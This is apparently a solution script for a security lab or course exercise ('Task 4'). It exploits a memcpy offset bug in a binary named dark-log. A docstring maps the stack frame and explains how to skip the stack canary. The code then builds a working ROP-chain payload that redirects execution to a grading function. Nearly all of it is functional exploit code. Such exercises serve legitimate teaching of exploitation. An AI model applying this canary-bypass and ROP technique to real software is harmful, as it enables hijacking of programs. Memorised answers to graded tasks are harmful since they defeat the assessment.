#!/usr/bin/env python3
"""Task 4 -- bypass the stack canary of attack/dark-log.

input() has this layout on the stack (expression = rbp-0x120):

    offset   0 : char expression[128]      <- gets() writes here
    offset 128 : char logMsg[128]          <- memcpy() destination
    offset 256 : int  len                  <- f.len, initialised to 0
    offset 280 : canary                    <- rbp-8
    offset 288 : saved rbp
    offset 296 : return address

The bug: `memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression))` uses the
attacker controlled `f.len` as an offset for the destination.  A single gets()
overflow can therefore (a) set f.len and (b) place a return address that is copied
verbatim, without ever touching the canary:

  * write only 260 bytes -> stops in the padding, canary (offset 280) intact;
  * f.len = 0xa0 -> destination = logMsg + 0xa0 = rbp, so the 128-byte memcpy
    overwrites saved rbp / return address (offsets 288/296) but *not* the canary
    at rbp-8;
  * expression[0:128] is the copied source, so expression[8:16] becomes the new
    return address and expression[16:...] the rest of the ROP chain.

Chain: [ret] [pop rdi; ret] [4] [grade_eval] [junk]
"""
import sys
import struct

RET = 0x4015F9              # plain "ret", fixes the 16-byte stack alignment
POP_RDI_RET = 0x4018A3      # "5f c3" (inside "pop r15 ; ret" of __libc_csu_init)
GRADE_EVAL = 0x401677

CANARY_OFF = 8 + 0x120 - 8      # 280 : distance from expression to the canary
FRAME_OFF = 8 + 0x120           # 288 : saved rbp  (ret at 296)
LEN = 0xA0                      # 160 : f.len -> logMsg + 0xa0 == rbp

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

chain = b""
chain += p64(0xDEADBEEFDEADBEEF)        # saved rbp (copied to [rbp])
chain += p64(RET)                       # alignment
chain += p64(POP_RDI_RET)
chain += p64(4)                         # rdi = 4 -> grade_eval(4)
chain += p64(GRADE_EVAL)
chain += p64(0)                         # grade_eval() returns into nothing -> SIGSEGV

payload = chain.ljust(0x80, b"A")       # source of the memcpy
payload += b"B" * 0x80                  # logMsg (overwritten by memcpy anyway)
payload += p32(LEN)                     # f.len = 160

assert len(payload) == 0x104, len(payload)
assert len(payload) < CANARY_OFF, "the canary must stay untouched"
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
